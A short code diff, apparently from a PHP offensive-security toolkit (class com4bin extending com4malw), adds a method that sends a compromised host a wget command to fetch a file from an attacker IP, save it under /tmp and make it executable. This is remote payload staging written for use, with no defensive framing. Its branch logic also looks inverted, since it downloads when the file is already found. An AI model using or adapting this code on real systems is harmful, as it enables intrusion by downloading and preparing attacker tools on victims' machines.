@@ -35,6 +35,19 @@ class com4bin extends com4malw{
 
 			
 	
+	public function bin2path($stream,$filename,$ip_attacker){
+	    $this->titre(__FUNCTION__);
+	    $path_socat = $this->file4locate($stream,$filename);
+	    if (!empty($path_socat)) {
+	        $query = "wget 'http://$ip_attacker:$this->port_rfi/$filename' -O /tmp/$filename && chmod +x /tmp/$filename ";
+	        $this->req_str($stream, $query, $this->stream_timeout, "");
+	        return "/tmp/$filename";
+	    }
+	    else {
+	        if ($this->file4exist8path($stream, $path_socat)) return $path_socat;
+	        else $this->log2error("$filename to download");
+	    }
+	}
 	
 	function payload2check4norme($cmd, $badchars) {
 	    $cmd = str_replace('\\','#',$cmd);
